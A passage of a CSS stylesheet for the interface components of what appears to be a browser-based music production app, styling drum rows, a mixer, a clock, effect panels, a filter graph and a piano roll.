	right: 0;
	bottom: 0;
}
.gsuiDrumrow-prop {
	outline: 0;
	font-size: 11px;
	font-weight: bold;
	font-family: inherit;
	cursor: pointer;
}
.gsuiDrumrow-propPan { --color: var( --gsuiDrumrow-pan ); }
.gsuiDrumrow-propGain { --color: var( --gsuiDrumrow-gain ); }
.gsuiDrumrow-propDetune { --color: var( --gsuiDrumrow-detune ); }
.gsuiDrumrow-prop + .gsuiDrumrow-prop {
	margin-left: 4px;
}
.gsuiDrumrow-propRadio {
	position: absolute;
	visibility: hidden;
}
.gsuiDrumrow-propSpan {
	color: var( --color );
	padding: 2px 4px;
	border-radius: 3px;
	opacity: 0;
	transition: .1s background-color, .2s opacity;
}
.gsuiDrumrow-propSpanValue {
	font-size: 14px;
	font-family: var( --gsui-font-number );
}
.gsuiDrumrow-open .gsuiDrumrow-propSpan {
	opacity: 1;
}
.gsuiDrumrow-propSpan:focus,
.gsuiDrumrow-propSpan:hover {
	background-color: var( --gsuiDrumrow-prop-bgHover );
}
.gsuiDrumrow-propRadio:checked + .gsuiDrumrow-propSpan {
	color: var( --gsuiDrumrow-bg );
	background-color: var( --color );
}

/* .......................................................................... */
.gsuiDrumrow-grip {
	position: absolute;
	width: var( --grip-w );
	top: 0;
	left: 0;
	bottom: 0;
	display: flex;
	align-items: center;
	justify-content: center;
	font-size: 12px;
	cursor: grab;
	background-color: var( --gsuiDrumrow-grip-bg );
}
.gsuiDrumrow-grip .gsuiIcon {
	pointer-events: none;
	opacity: .4;
}
.gsuiDrumrow-btnToggle {
	position: absolute;
	left: 0;
	width: var( --toggle-w );
	height: var( --name-h );
	top: 0;
	border: 0;
	outline: 0;
	padding: 0;
	font-size: 8px;
	color: var( --gsuiDrumrow-toggle-bg );
	cursor: pointer;
	background: none;
	transition: .1s opacity;
}
.gsuiDrumrow-name {
	position: absolute;
	top: 0;
	left: var( --toggle-w );
	right: calc( var( --delete-w ) + var( --propsExpand-w ) + 6px );
	height: var( --name-h );
	line-height: var( --name-h );
	overflow: hidden;
	white-space: nowrap;
	text-overflow: ellipsis;
	font-size: 12px;
	font-weight: bold;
	pointer-events: none;
}
.gsuiDrumrow-nameInfo {
	font-style: italic;
	font-weight: normal;
	opacity: .7;
}

/* .......................................................................... */
.gsuiDrumrow-waveWrap {
	position: absolute;
	overflow: hidden;
	top: var( --name-h );
	left: 0;
	right: calc( var( --slider-w ) * 3 + 8px );
	bottom: 0;
	pointer-events: none;
}
.gsuiDrumrow-wave {
	position: absolute;
	top: 0;
	width: 100%;
	height: 100%;
	fill: currentColor;
	opacity: .5;
}
.gsuiDrumrow-startCursor {
	position: absolute;
	top: 0;
	left: 0;
	width: 100%;
	height: 100%;
	border-right: 2px solid;
	background-image: linear-gradient( 90deg, transparent 0%, currentColor 300% );
	animation-name: gsuiDrumrow-startCursor-anim;
	animation-duration: inherit;
	animation-fill-mode: forwards;
	animation-timing-function: linear;
}
.gsuiDrumrow-mute .gsuiDrumrow-startCursor {
	visibility: hidden;
}
@keyframes gsuiDrumrow-startCursor-anim {
	from { left: -100%; }
	to { left: 100%; }
}

/* .......................................................................... */
.gsuiDrumrow-detune,
.gsuiDrumrow-pan,
.gsuiDrumrow-gain {
	--gsuiSlider-lineBgColor: var( --gsuiDrumrow-slider-bg );
	position: absolute;
	top: var( --name-h );
	width: var( --slider-w );
	bottom: 2px;
}
.gsuiDrumrow .gsuiSlider-eventCatcher {
	top: -2px;
	left: -2px;
	right: -2px;
	bottom: -2px;
}
.gsuiDrumrow-detune {
	--gsuiSlider-lineColor: var( --gsuiDrumrow-detune );
	right: calc( 2 * var( --slider-w ) + 6px );
}
.gsuiDrumrow-pan {
	--gsuiSlider-lineColor: var( --gsuiDrumrow-pan );
	right: calc( var( --slider-w ) + 4px );
}
.gsuiDrumrow-gain {
	--gsuiSlider-lineColor: var( --gsuiDrumrow-gain );
	right: 2px;
}

/* .......................................................................... */
.gsuiDrumrow.gsuiDrumrows-dragover .gsuiDrumrow-btnToggle,
.gsuiDrumrow.gsuiDrumrows-dragover .gsuiDrumrow-name,
.gsuiDrumrow.gsuiDrumrows-dragover .gsuiDrumrow-waveWrap {
	opacity: 0;
}
.gsuiDrumrow .gsuiDrumrows-drop {
	position: absolute;
	top: 0;
	left: 0;
	right: 0;
	bottom: 0;
}
.gsuiDrumrow-btnProps,
.gsuiDrumrow-btnDelete {
	position: absolute;
	right: 0;
	border: 0;
	outline: 0;
	padding: 0;
	width: var( --delete-w );
	height: var( --name-h );
	color: inherit;
	cursor: pointer;
	font-size: 12px;
	background: none;
	opacity: .3;
	transition: .1s opacity;
}
.gsuiDrumrow-btnProps {
	right: calc( var( --delete-w ) + 2px );
	width: var( --propsExpand-w );
	opacity: .5;
}
.gsuiDrumrow-open .gsuiDrumrow-btnProps {
	text-shadow: 0 0 6px;
	opacity: .8;
}
.gsuiDrumrow .gsuiDrumrow-btnProps:hover,
.gsuiDrumrow .gsuiDrumrow-btnProps:focus,
.gsuiDrumrow .gsuiDrumrow-btnDelete:hover,
.gsuiDrumrow .gsuiDrumrow-btnDelete:focus {
	opacity: 1;
}
:root {
	--gsuiDrums-color: #fff;
	--gsuiDrums-drum-bg: #5acd;
	--gsuiDrums-drum-color: #000;
	--gsuiDrums-drumprop-bg: #0002;
	--gsuiDrums-drumprop-color: #0004;
	--gsuiDrums-drumcut-bg: #48ad;
	--gsuiDrums-line-border: #2e4145;
	--gsuiDrums-line-mute-bg: #0003;
	--gsuiDrums-loop-bg: #000;
	--gsuiDrums-currentTime-bg: #ff91;
	--gsuiDrums-drumHover-border: #5ac;
	--gsuiDrums-drumHover-bg: #5ac3;
	--gsuiDrums-shadow-bg: #000a;
}
.gsuiDrums {
	display: block;
	height: 100%;
	color: var( --gsuiDrums-color );
}

/* .......................................................................... */
.gsuiDrums .gsuiTimewindow-currentTime {
	margin-left: 0;
	opacity: .1;
}
.gsuiDrums .gsuiTimewindow-step {
	display: none;
}

/* .......................................................................... */
.gsuiDrums-shadow {
	position: absolute;
	z-index: 1;
	top: 0;
	left: 0;
	right: 0;
	bottom: 0;
	background-color: var( --gsuiDrums-shadow-bg );
	opacity: 0;
	visibility: hidden;
	transition: .2s;
	transition-property: opacity, visibility;
}
.gsuiDrums-shadowed .gsuiDrums-shadow {
	opacity: 1;
	visibility: visible;
}

/* .......................................................................... */
.gsuiDrums-line.gsuiReorder-dragging {
	opacity: .5;
	background: #B82587;
}
.gsuiDrums-line {
	position: relative;
	width: 1000000px;
	font-size: var( --gsuiTimewindow-lineH );
	height: 1em;
	box-sizing: border-box;
	border-bottom: 1px solid var( --gsuiDrums-line-border );
	transition: .2s height, .1s filter, .1s background-color;
}
.gsuiDrums-lineOpen {
	height: calc( 1em + 1.5em );
}
.gsuiDrums-line.gsuiDrumrow-mute {
	filter: brightness( .8 ) contrast( .8 );
	background-color: var( --gsuiDrums-line-mute-bg );
}
.gsuiDrums-lineDrums {
	position: absolute;
	top: 0;
	left: 0;
	right: 0;
	height: 1em;
}
.gsuiDrums-lineIn {
	height: 100%;
	box-sizing: border-box;
	border-bottom: 1px dashed var( --gsuiDrums-line-border );
	font-size: var( --gsuiTimewindow-pxperbeat );
	cursor: pointer;
}
.gsuiDrums-lineProps {
	position: absolute;
	top: 1em;
	left: 0;
	right: 0;
	bottom: 0;
}

/* .......................................................................... */
.gsuiDrums-drumHover,
.gsuiDrums-drumcutHover {
	position: absolute;
	z-index: 1;
	background: #B82587;
}
.gsuiDrums-drumHover {
	height: 66%;
}
.gsuiDrums-drumcutHover {
	bottom: 0;
	height: 34%;
}
.gsuiDrums-drumcutHoverIn,
.gsuiDrums-drumHoverIn {
	box-sizing: border-box;
	height: 100%;
	margin: 0 1px 1px 0;
	border: 2px solid var( --gsuiDrums-drumHover-border );
	border-radius: 4px;
	background-color: var( --gsuiDrums-drumHover-bg );
	pointer-events: none;
}

/* .......................................................................... */
.gsuiDrums-drum,
.gsuiDrums-drumcut {
	position: absolute;
	width: 1em;
}
.gsuiDrums-drum {
	height: 66%;
}
.gsuiDrums-drumcut {
	bottom: 1px;
	height: calc( 34% - 2px );
}
.gsuiDrums-previewDeleted,
.gsuiDrums-preview {
	opacity: .4;
}
.gsuiDrums-drumIn,
.gsuiDrums-drumcutIn {
	display: flex;
	align-items: center;
	flex-direction: column;
	justify-content: center;
	height: 100%;
	margin: 0 1px 1px 0;
	border-radius: 2px;
	color: var( --gsuiDrums-drum-color );
	background-color: var( --gsuiDrums-drum-bg );
	pointer-events: none;
}
.gsuiDrums-drumcutIn {
	font-size: 10px;
	background-color: var( --gsuiDrums-drumcut-bg );
}
.gsuiDrums-drumcutIn .gsuiIcon {
	opacity: .7;
}
.gsuiDrums-drumProp {
	position: relative;
	width: 100%;
	height: 3px;
	background-color: var( --gsuiDrums-drumprop-bg );
	transition: .1s height;
}
.gsuiDrums-lineOpen[ data-prop="pan" ] .gsuiDrums-drumProp[ data-value="pan" ],
.gsuiDrums-lineOpen[ data-prop="gain" ] .gsuiDrums-drumProp[ data-value="gain" ],
.gsuiDrums-lineOpen[ data-prop="detune" ] .gsuiDrums-drumProp[ data-value="detune" ] {
	height: 6px;
}
.gsuiDrums-drumProp + .gsuiDrums-drumProp {
	margin-top: 2px;
}
.gsuiDrums-drumPropValue {
	position: absolute;
	height: 100%;
	background-color: var( --gsuiDrums-drumprop-color );
}
.gsuiClock {
	--gsuiClock-bg: #444;
	--gsuiClock-color: #ddd;
}
.gsuiClock {
	display: flex;
	user-select: none;
	color: var( --gsuiClock-color );
	border-radius: 4px;
	font-size: 22px;
}

.gsuiClock-relative {
	position: relative;
	padding-left: 8px;
	border-top-left-radius: inherit;
	border-bottom-left-radius: inherit;
	background-color: var( --gsuiClock-bg );
}
.gsuiClock-absolute {
	display: flex;
	position: absolute;
	white-space: nowrap;
	align-items: baseline;
	padding-top: 3px;
	font-family: var( --gsui-font-number );
}

.gsuiClock-modes {
	position: relative;
	display: flex;
	margin: 0;
	border: 0;
	outline: 0;
	padding: 6px 8px;
	border-top-right-radius: inherit;
	border-bottom-right-radius: inherit;
	cursor: pointer;
	color: inherit;
	font-size: inherit;
	background-color: var( --gsuiClock-bg );
	flex-direction: column;
	justify-content: space-between;
}
.gsuiClock-modes:focus {
	box-shadow: 0 0 1px 2px #69b;
}
.gsuiClock-mode {
	width: 8px;
	height: 8px;
	border: 2px solid;
	border-radius: 2px;
	box-sizing: border-box;
	opacity: .5;
}
.gsuiClock[ mode="beat" ] .gsuiClock-beat,
.gsuiClock[ mode="second" ] .gsuiClock-second {
	opacity: 1;
	background-color: currentColor;
}

.gsuiClock-b::before {
	content: ":";
	margin: 0 .1em;
}
.gsuiClock-c {
	font-size: 14px;
	opacity: .5;
}
.gsuiClock-c::before {
	content: ".";
	margin: 0 .2em;
}
.gsuiMixer {
	--gsuiMixer-bg: initial;
	--gsuiMixerChannel-bg: #555;
	--gsuiMixerChannel-bg2: #C7C7C7;
	--gsuiMixerChannel-color: #fff;
	--gsuiMixerChannel-selected-bg: #666;
	--gsuiMixerChannel-width: 52px;
	--gsuiMixerChannel-pan-color: #FF47E7;
	--gsuiMixerChannel-gain-color: #00DDFF;
	--gsuiMixerChannel-connect-input-color: #f99;
	--gsuiMixerChannel-connect-output-color: #ff9;
	--gsuiMixerChannel-toggle-bg: #ffa;
	--gsuiMixerChannel-toggleOff-bg: #fff2;
	--gsuiMixerChannel-analyser-bg: #222;
	--gsuiMixerChannel-name-font: var( --font-default );
}
.gsuiMixer {
	height: 100%;
	position: relative;
	color: var( --gsuiMixerChannel-color );
	background-color: var( --gsuiMixer-bg );
	user-select: none;
	-webkit-user-select: none;
}

.gsuiMixer-panMain,
.gsuiMixer-panChannels {
	position: absolute;
	overflow: hidden;
	top: 0;
	left: 0;
	bottom: 0;
}

/* .gsuiMixer-panChannels */
/* .......................................................................... */
.gsuiMixer-panChannels {
	left: calc( var( --gsuiMixerChannel-width ) + 6px );
	right: 0;
	display: grid;
	overflow-x: scroll;
	grid-auto-flow: column;
	grid-auto-columns: min-content;
}
.gsuiMixer-panChannels::after {
	order: 2147483647;
	content: ".";
	opacity: 0;
	margin-left: 16px;
}
.gsuiMixer-panChannels .gsuiMixerChannel:nth-child( odd ) {
	--gsuiMixerChannel-bg: var( --gsuiMixerChannel-bg2 );
}

/* .gsuiMixer-addChan */
/* .......................................................................... */
.gsuiMixer-addChan {
	position: relative;
	order: 2147483646;
	width: 52px;
	border: 0;
	padding: 0;
	outline: 0;
	font-size: 18px;
	color: inherit;
	cursor: pointer;
	border-radius: 2px;
	background: none;
	opacity: .4;
	transition: .2s opacity;
}
.gsuiMixer-addChan:focus,
.gsuiMixer-addChan:hover {
	opacity: .6;
}
.gsuiMixer-addChan::before {
	content: "";
	top: 6px;
	left: 6px;
	right: 6px;
	bottom: 6px;
	opacity: .4;
	border: 2px dashed;
	position: absolute;
}

/* .gsuiMixerChannel */
/* .......................................................................... */
.gsuiMixerChannel {
	display: flex;
	position: relative;
	align-items: center;
	flex-direction: column;
	height: 100%;
	width: var( --gsuiMixerChannel-width );
	min-width: var( --gsuiMixerChannel-width );
	background-color: var( --gsuiMixerChannel-bg );
	--gsuiSlider-lineBgColor: rgba( 0, 0, 0, .2 );
}
.gsuiMixer .gsuiMixerChannel.gsuiMixer-selected {
	--gsuiMixerChannel-bg: var( --gsuiMixerChannel-selected-bg );
}
.gsuiMixerChannel-muted {
	--gsuiMixerChannel-toggle-bg: var( --gsuiMixerChannel-toggleOff-bg );
}
.gsuiMixerChannel-muted .gsuiSlider {
	--gsuiSlider-lineColor: rgba( 255, 255, 255, .3 );
}

/* .......................................................................... */
.gsuiMixerChannel-delete {
	display: flex;
	position: absolute;
	align-items: center;
	justify-content: center;
	top: 2px;
	right: 2px;
	border: 0;
	opacity: 0;
	padding: 0;
	outline: 0;
	color: inherit;
	cursor: pointer;
	font-size: 12px;
	line-height: 1em;
	background: none;
	transition: opacity .2s;
}
.gsuiMixer-panMain .gsuiMixerChannel-delete {
	display: none;
}
.gsuiMixerChannel:hover .gsuiMixerChannel-delete {
	opacity: .5;
}
.gsuiMixerChannel .gsuiMixerChannel-delete:focus,
.gsuiMixerChannel .gsuiMixerChannel-delete:hover {
	opacity: 1;
}

/* .......................................................................... */
.gsuiMixerChannel-nameWrap {
	display: flex;
	align-items: center;
	justify-content: center;
	box-sizing: border-box;
	overflow: hidden;
	width: 100%;
	border: 0;
	outline: 0;
	padding: 3px;
	color: inherit;
	height: 34px;
	min-height: 34px;
	font-size: 12px;
	font-family: var( --gsuiMixerChannel-name-font );
	background-color: transparent;
}
.gsuiMixerChannel-name {
	display: block;
	overflow: hidden;
	word-wrap: break-word;
	text-align: center;
	font-size: 10px;
	padding-right: .15ch;
	user-select: none;
	-webkit-user-select: none;
}
.gsuiMixerChannel.gsuiMixer-selected .gsuiMixerChannel-name {
	font-weight: bold;
}
.gsuiMixerChannel-muted .gsuiMixerChannel-name {
	opacity: .5;
}
.gsuiMixer-panMain .gsuiMixerChannel-name {
	font-style: italic;
}

/* .......................................................................... */
.gsuiMixerChannel-analyserWrap {
	position: relative;
	flex: 10;
	width: 100%;
	max-height: 160px;
}
.gsuiMixer-selected .gsuiMixerChannel-analyserWrap {
	box-shadow: 0 -2px var( --gsuiMixerChannel-gain-color );
}
.gsuiMixerChannel-analyser {
	position: absolute;
	width: 100%;
	height: 100%;
	opacity: .8;
	background: #B82587;
}

/* .......................................................................... */
.gsuiMixerChannel-toggle {
	width: 100%;
	border: 0;
	padding: 0;
	outline: 0;
	font-size: 8px;
	min-height: 18px;
	cursor: pointer;
	color: var( --gsuiMixerChannel-toggle-bg );
	background: none;
}

/* .......................................................................... */
.gsuiMixerChannel-pan {
	width: 100%;
	height: 24px;
	min-height: 24px;
	z-index: 1;
	overflow: hidden;
	--gsuiSlider-lineColor: var( --gsuiMixerChannel-pan-color );
}
.gsuiMixerChannel-gain {
	flex: 1;
	width: 6px;
	height: 48px;
	margin-top: 6px;
	min-height: 32px;
	--gsuiSlider-lineColor: var( --gsuiMixerChannel-gain-color );
}
.gsuiMixerChannel-gain .gsuiSlider-eventCatcher {
	left: -12px;
	right: -12px;
}

/* .......................................................................... */
.gsuiMixerChannel-connect {
	width: 100%;
	border: 0;
	padding: 0;
	outline: 0;
	z-index: 1;
	height: 16px;
	min-height: 16px;
	cursor: pointer;
	font-size: 16px;
	background-color: transparent;
}
.gsuiMixerChannel-connectA {
	color: var( --gsuiMixerChannel-connect-output-color );
}
.gsuiMixerChannel-connectB {
	color: var( --gsuiMixerChannel-connect-input-color );
}

/* .......................................................................... */
.gsuiMixerChannel-grip {
	width: 100%;
	height: 18px;
	display: flex;
	align-items: center;
	justify-content: center;
	font-size: 12px;
	cursor: grab;
	opacity: .6;
	background: #B82587;
}
.gsuiMixer-panMain .gsuiMixerChannel-grip {
	visibility: hidden;
	pointer-events: none;
}
.gsuiCurves {
	display: block;
	position: relative;
	height: 100%;
}
.gsuiCurves-svg {
	position: absolute;
	width: 100%;
	height: 100%;
}
.gsuiCurves-markText {
	fill: currentColor;
	font-size: 10px;
	opacity: .2;
}
.gsuiCurves-markBg {
	fill: currentColor;
	opacity: .025;
}
.gsuiCurves-line {
	stroke: currentColor;
	stroke-width: 2;
	stroke-dasharray: 4;
	opacity: .1;
}
.gsuiCurves-curve {
	fill: none;
	stroke: currentColor;
	stroke-width: 3;
}
:root {
	--gsuiEffects-color: #fff;
}

.gsuiEffects {
	display: flex;
	flex-direction: column;
	color: var( --gsuiEffects-color );
}

/* .......................................................................... */
.gsuiEffects-list {
	display: flex;
	overflow: auto;
	flex-direction: column;
}

/* .......................................................................... */
.gsuiEffects-addBtn {
	position: relative;
	order: 2147483646;
	border: 0;
	outline: 0;
	width: 100%;
	height: 52px;
	color: inherit;
	font-size: 18px;
	cursor: pointer;
	border-radius: 2px;
	background: none;
	opacity: .4;
	transition: .2s opacity;
}
.gsuiEffects-addBtn:focus,
.gsuiEffects-addBtn:hover {
	opacity: .6;
}
.gsuiEffects-addBtn::before {
	content: "";
	top: 6px;
	left: 6px;
	right: 6px;
	bottom: 6px;
	opacity: .4;
	border: 2px dashed;
	position: absolute;
}
.gsuiEffects-addSelect {
	order: 2147483647;
	width: 100%;
	height: calc( 2 * 24px );
	border: 0;
	font: inherit;
	color: inherit;
	background: #B818A3;
	transition: .1s;
	transition-property: height, visibility;
}
.gsuiEffects-addSelect option {
	box-sizing: border-box;
	padding: 4px;
	height: 24px;
	font-size: 12px;
}
.gsuiEffects-addBtn:not( :focus ) + .gsuiEffects-addSelect:not( :focus ) {
	height: 0;
	visibility: hidden;
}

/* .......................................................................... */
.gsuiEffects-fx-head {
	display: flex;
	height: 36px;
	font-size: 12px;
	line-height: 36px;
	background: #B818A3;
}
.gsuiEffects-fx-expand,
.gsuiEffects-fx-toggle,
.gsuiEffects-fx-remove {
	width: 20px;
	border: 0;
	padding: 0;
	outline: 0;
	color: inherit;
	cursor: pointer;
	font-size: inherit;
	background-color: transparent;
}
.gsuiEffects-fx-grip {
	width: 16px;
	display: flex;
	align-items: center;
	justify-content: center;
	font-size: 12px;
	cursor: grab;
	opacity: .6;
	background: #B818A3;
}
.gsuiEffects-fx-expand {
	font-size: 14px;
}
.gsuiEffects-fx-toggle {
	font-size: 8px;
	color: #222;
}
.gsuiEffects-fx-enable .gsuiEffects-fx-toggle {
	color: #ffa;
}
.gsuiEffects-fx-name {
	flex: 1;
	opacity: .5;
}
.gsuiEffects-fx-enable .gsuiEffects-fx-name {
	opacity: 1;
}
.gsuiEffects-fx-remove {
	width: 32px;
	opacity: .3;
	transition: .1s opacity;
}
.gsuiEffects-fx-remove:hover,
.gsuiEffects-fx-remove:focus {
	opacity: 1;
}
.gsuiEffects-fx-content {
	height: 0;
	opacity: 0;
	overflow: hidden;
	transition: .1s;
	transition-property: height, opacity;
}
.gsuiEffects-fx-expanded .gsuiEffects-fx-content {
	opacity: 1;
}
.gsuiFxFilter {
	--gsuiFxFilter-bg: #666;
	--gsuiFxFilter-inputBg: #555;
	--gsuiFxFilter-Q: #d7b;
	--gsuiFxFilter-gain: #ff9;
	--gsuiFxFilter-detune: #fff;
	--gsuiFxFilter-frequency: #8c8;
}
.gsuiFxFilter {
	display: grid;
	box-sizing: border-box;
	height: 100%;
	color: inherit;
	padding: 8px;
	grid-gap: 8px;
	grid-template:
		"type graph     gain Q     " 1fr
		"type graph     gain detune" 1fr
		".    frequency .    .     " 8px
		/32px 1fr       8px  50px;
	background-color: #666;
	--gsuiSlider-lineBgColor: var( --gsuiFxFilter-inputBg );
}

/* .......................................................................... */
.gsuiFxFilter-area {
	display: flex;
	flex-direction: column;
}
.gsuiFxFilter-area-label {
	align-self: center;
	height: 20px;
	font-size: 12px;
	opacity: .5;
}
.gsuiFxFilter-area-content {
	flex: 1;
	position: relative;
}

/* .......................................................................... */
.gsuiFxFilter-areaType {
	grid-area: type;
}
.gsuiFxFilter-areaGraph {
	grid-area: graph;
}
.gsuiFxFilter-areaGain {
	grid-area: gain;
	--gsuiSlider-lineColor: var( --gsuiFxFilter-gain );
}
.gsuiFxFilter-areaQ {
	grid-area: Q;
	--gsuiSlider-lineColor: var( --gsuiFxFilter-Q );
}
.gsuiFxFilter-areaDetune {
	grid-area: detune;
	--gsuiSlider-lineColor: var( --gsuiFxFilter-detune );
}
.gsuiFxFilter-areaFrequency {
	grid-area: frequency;
	--gsuiSlider-lineColor: var( --gsuiFxFilter-frequency );
}
.gsuiFxFilter-areaQ gsui-slider,
.gsuiFxFilter-areaDetune gsui-slider {
	min-height: 40px;
}

/* .......................................................................... */
.gsuiFxFilter-areaGain .gsuiSlider-eventCatcher,
.gsuiFxFilter-areaFrequency .gsuiSlider-eventCatcher {
	top: -8px;
	left: -8px;
	right: -8px;
	bottom: -8px;
}

/* .......................................................................... */
.gsuiFxFilter-areaGraph .gsuiFxFilter-area-label {
	align-self: flex-start;
}
.gsuiFxFilter-areaGraph .gsuiFxFilter-area-content {
	border-radius: 4px;
	background-color: rgba( 0, 0, 0, .5 );
}
.gsuiFxFilter .gsuiCurves-curve {
	color: currentColor;
	opacity: .25;
}
.gsuiFxFilter-enable .gsuiCurves-curve {
	color: var( --gsuiFxFilter-frequency );
	opacity: 1;
}

/* .......................................................................... */
.gsuiFxFilter-areaType .gsuiFxFilter-area-content {
	display: flex;
	overflow: hidden;
	border-radius: 4px;
	flex-direction: column;
}
.gsuiFxFilter-areaType-btn {
	position: relative;
	flex: 1;
	border: 0;
	outline: 0;
	padding: 0;
	cursor: pointer;
	stroke: #ff9;
	stroke-width: 1.5px;
	background-color: var( --gsuiFxFilter-inputBg );
}
.gsuiFxFilter-areaType-btn:hover,
.gsuiFxFilter-areaType-btn:focus {
	stroke-width: 2px;
}
.gsuiFxFilter-areaType-btnSelected {
	stroke: #222;
	background-color: #ff9;
}
.gsuiFxFilter-areaType-btn svg {
	position: absolute;
	top: 0;
	left: 0;
	width: 100%;
	height: 100%;
	fill: transparent;
	stroke: inherit;
	stroke-width: inherit;
	pointer-events: none;
}
.gsuiReorder-dragging {
	opacity: 0;
	transition: none;
}
:root {
	--gsuiDragline-color: #fff;
	--gsuiDragline-dotSize: 8px;
	--gsuiDragline-dotRad: 50%;
	--gsuiDragline-lineSize: 4px;
}

/* ................................................................ */
.gsuiDragline {
	position: absolute;
	max-width: 0;
	max-height: 0;
	color: var( --gsuiDragline-color );
}
.gsuiDragline-dragging,
.gsuiDragline-dragging .gsuiDragline-to {
	pointer-events: none;
}

/* ................................................................ */
.gsuiDragline-main {
	position: relative;
	pointer-events: none;
}

/* ................................................................ */
.gsuiDragline-line {
	position: absolute;
	bottom: 0;
	right: 0;
	width: 0;
	height: 0;
	fill: none;
	stroke: currentColor;
	stroke-width: var( --gsuiDragline-lineSize );
	stroke-linecap: round;
}
.gsuiDragline-down .gsuiDragline-line {
	top: 0;
	bottom: auto;
}
.gsuiDragline-right .gsuiDragline-line {
	left: 0;
	right: auto;
}

/* ................................................................ */
.gsuiDragline-to {
	position: absolute;
	width: var( --gsuiDragline-dotSize );
	height: var( --gsuiDragline-dotSize );
	margin: calc( var( --gsuiDragline-dotSize ) / -2 );
	cursor: pointer;
	border-radius: var( --gsuiDragline-dotRad );
	pointer-events: all;
	background-color: var( --gsuiDragline-color );
	transition: .2s background-color;
}
.gsuiDragline-down .gsuiDragline-to { bottom: 0; }
.gsuiDragline-right .gsuiDragline-to { right: 0; }
.gsuiDragline-main:not( .gsuiDragline-down ) .gsuiDragline-to { top: 0; }
.gsuiDragline-main:not( .gsuiDragline-right ) .gsuiDragline-to { left: 0; }

/* ................................................................ */
.gsuiDragline-drop {
	position: relative;
	max-width: 0;
	max-height: 0;
}
.gsuiDragline-drop::before {
	content: "";
	position: absolute;
	width: 0;
	height: 0;
	margin: 0;
	background-color: var( --gsuiDragline-color );
	transition: .2s all;
}
.gsuiDragline-dropActive::before {
	width: var( --gsuiDragline-dotSize );
	height: var( --gsuiDragline-dotSize );
	margin: calc( var( --gsuiDragline-dotSize ) / -2 );
	cursor: pointer;
	border-radius: var( --gsuiDragline-dotRad );
}
.gsuiDragline-dropActive:hover::before {
	transform: scale( 2 );
}
.gsuiBeatlines {
	position: absolute;
	top: 0;
	left: 0;
	right: 0;
	bottom: 0;
	pointer-events: none;
	background-repeat: no-repeat;
}
:root {
	--gsuiBlocksManager-timeline-height: 32px;
	--gsuiBlocksManager-selection-bgColor: #b226;
	--gsuiBlocksManager-selection-borderColor: #f44;
	--gsuiBlocksManager-blockColor: #5acc;
	--gsuiBlocksManager-blockSelectedColor: #f88c;
}

/* .......................................................................... */
.gsuiBlocksManager-selection {
	position: absolute;
	box-sizing: border-box;
	top: 0;
	z-index: 2;
	border: 2px solid var( --gsuiBlocksManager-selection-borderColor );
	border-radius: 4px;
	background-color: var( --gsuiBlocksManager-selection-bgColor );
	transition: .2s;
	transition-property: opacity, visibility;
}
.gsuiBlocksManager-selection-hidden {
	opacity: 0;
	visibility: hidden;
}

/* .......................................................................... */
.gsuiBlocksManager-block {
	position: absolute;
	z-index: 1;
	height: 100%;
	border-radius: 2px;
	background-color: var( --gsuiBlocksManager-blockColor );
	transition: .1s;
	transition-property: opacity, background-color;
}
.gsuiBlocksManager-block-selected {
	--gsuiBlocksManager-blockColor: var( --gsuiBlocksManager-blockSelectedColor );
}
.gsuiBlocksManager-block-hidden {
	z-index: 0;
	opacity: .3;
}
.gsuiBlocksManager-block-crop {
	position: absolute;
	z-index: 2;
	width: 50%;
	height: 100%;
	max-width: 8px;
	border-radius: inherit;
	background-color: #000;
	opacity: 0;
	transition: .1s opacity;
}
.gsuiBlocksManager-block-cropA {
	left: 0;
	border-top-right-radius: 0;
	border-bottom-right-radius: 0;
}
.gsuiBlocksManager-block-cropB {
	right: 0;
	border-top-left-radius: 0;
	border-bottom-left-radius: 0;
}
.gsuiBlocksManager-block:hover .gsuiBlocksManager-block-crop,
.gsuiBlocksManager-block.gsui-hover .gsuiBlocksManager-block-crop {
	opacity: .12;
}
.gsuiBlocksManager-block .gsuiBlocksManager-block-crop:hover,
.gsuiBlocksManager-block .gsuiBlocksManager-block-crop.gsui-hover {
	opacity: .25;
}
.gsuiPatternroll {
	display: flex;
}

.gsuiPatternroll-block {
	display: flex;
	flex-direction: column;
	white-space: nowrap;
	color: var( --gsuiPatterns-pattern-color );
	--gsuiPatterns-pattern-color: #444;
}
.gsui-mute .gsuiPatternroll-block {
	opacity: .5;
}
.gsuiPatternroll-block-header {
	position: relative;
	box-sizing: border-box;
	z-index: 1;
	display: flex;
	border-radius: inherit;
	flex-direction: column;
	justify-content: center;
	padding: 0 4px;
	font-size: 11px;
	font-weight: bold;
	background-color: #fff3;
	pointer-events: none;
	user-select: none;
	-webkit-user-select: none;
}
.gsuiPatternroll-block-name {
	overflow: hidden;
	text-overflow: ellipsis;
}
.gsuiPatternroll-block-content {
	flex: 1;
	position: relative;
	pointer-events: none;
}
.gsuiPatternroll-block-content:empty {
	display: none;
}
.gsuiPatternroll-block-content svg {
	position: absolute;
	top: 0;
	left: 0;
	width: 100%;
	height: 100%;
	opacity: .8;
	fill: currentColor;
}

.gsui-row-small .gsuiPatternroll-block-header {
	background-color: inherit;
}
.gsui-row-small .gsuiPatternroll-block-header,
.gsui-row-small .gsuiPatternroll-block-content {
	position: absolute;
	width: 100%;
	height: 100%;
}

.gsuiPatternroll-block-placeholder {
	flex: 1;
	display: none;
	align-items: center;
	pointer-events: none;
	font-size: 14px;
	opacity: .5;
}
.gsuiPatternroll-block-content:empty + .gsuiPatternroll-block-placeholder {
	display: flex;
}
.gsuiPatternroll-block-placeholderIcon {
	margin: 0 8px;
}
.gsuiPatternroll-block-placeholderText {
	overflow: hidden;
	text-overflow: ellipsis;
	user-select: none;
	-webkit-user-select: none;
}
.gsuiPianoroll {
	display: flex;
	height: 500px;
	--gsuiDragline-dotSize: 10px;
	--gsuiDragline-dotRad: 2px;
	--gsuiDragline-lineSize: 3px;
}
.gsuiPianoroll:focus {
	outline: 1px solid var( --gsuiBlocksManager-blockColor );
}

/* .......................................................................... */
.gsuiPianoroll .gsuiKeys {
	z-index: 0;
	font-size: var( --gsuiTimewindow-lineH );
}
.gsuiPianoroll .gsuiTimewindow-rows {
	font-size: var( --gsuiTimewindow-lineH );
}
.gsuiPianoroll .gsuiKey-row > div {
	font-size: var( --gsuiTimewindow-pxperbeat );
}

/* .......................................................................... */
.gsuiPianoroll .gsuiTimewindow-panelContentDown {
	display: flex;
	align-items: center;
	justify-content: center;
}
.gsuiPianoroll-slidersSelect {
	border: 0;
	outline: 0;
	font: inherit;
	color: inherit;
	cursor: pointer;
	font-size: 12px;
	user-select: none;
	border-radius: 4px;
	background-color: #fff2;
	scrollbar-width: none;
